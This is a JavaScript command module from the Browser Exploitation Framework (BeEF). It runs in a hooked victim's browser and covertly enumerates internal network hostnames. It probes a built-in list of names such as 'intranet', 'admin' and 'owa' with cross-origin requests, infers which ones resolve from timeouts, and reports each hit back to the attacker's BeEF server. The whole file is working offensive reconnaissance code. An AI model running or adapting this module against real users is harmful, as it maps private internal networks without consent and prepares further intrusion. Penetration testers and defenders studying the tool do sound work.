//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var dns_list = "<%= @dns_list %>";
    var timeout = parseInt("<%= @timeout %>");

    var cont=0; 
    var port = 900;
    var protocol="http://";
    var hostnames;

    if(dns_list!="%default%") {
        hostnames = dns_list.split(","); 
    } else {
        hostnames = new Array("abc", "about", "accounts", "admin", "administrador", "administrator", "ads", "adserver", "adsl", "agent", "blog", "channel", "client", "dev", "dev1", "dev2", "dev3", "dev4", "dev5", "dmz", "dns", "dns0", "dns1", "dns2", "dns3", "extern", "extranet", "file", "forum", "forums", "ftp", "ftpserver", "host", "http", "https", "ida", "ids", "imail", "imap", "imap3", "imap4", "install", "intern", "internal", "intranet", "irc", "linux", "log", "mail", "map", "member", "members", "name", "nc", "ns", "ntp", "ntserver", "office", "owa", "phone", "pop", "ppp1", "ppp10", "ppp11", "ppp12", "ppp13", "ppp14", "ppp15", "ppp16", "ppp17", "ppp18", "ppp19", "ppp2", "ppp20", "ppp21", "ppp3", "ppp4", "ppp5", "ppp6", "ppp7", "ppp8", "ppp9", "pptp", "print", "printer", "project", "pub", "public", "preprod", "root", "route", "router", "server", "smtp", "sql", "sqlserver", "ssh", "telnet", "time", "voip", "w", "webaccess", "webadmin", "webmail", "webserver", "website", "win", "windows", "ww", "www", "wwww", "xml");
    }
    
    function notify() {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Internal DNS found: '+ hostnames[cont]);
        check_next();
    }
    
    function check_next() { 
        cont++;
        if(cont<hostnames.length) do_resolv(protocol + hostnames[cont] + ":" + port); 
        else setTimeout(function(){ beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=DNS Enumeration done') }, 1000); 
    }

    function do_resolv(url) {
        // Cross Origin Resource Sharing call
        var xhr = new XMLHttpRequest();
        if("withCredentials" in xhr) {
            xhr.open("GET", url, true);
        } else if(typeof XDomainRequest != "undefined") {
            xhr = new XDomainRequest();
            xhr.open("GET",url);
        } else {
            return -1;
        }
        
        xhr.onreadystatechange= function(e) { if(xhr.readyState==4) { clearTimeout(p); check_next(); } };
        xhr.send();
        var p = setTimeout(function() { xhr.onreadystatechange = function(evt) {}; notify(); }, 4000);
    }

    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Starting DNS enumeration: '+ hostnames.length + ' hostnames loaded');
    if(do_resolv(protocol + hostnames[0] + ":" + port)==-1) {
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Browser not supported'); 
    }

});
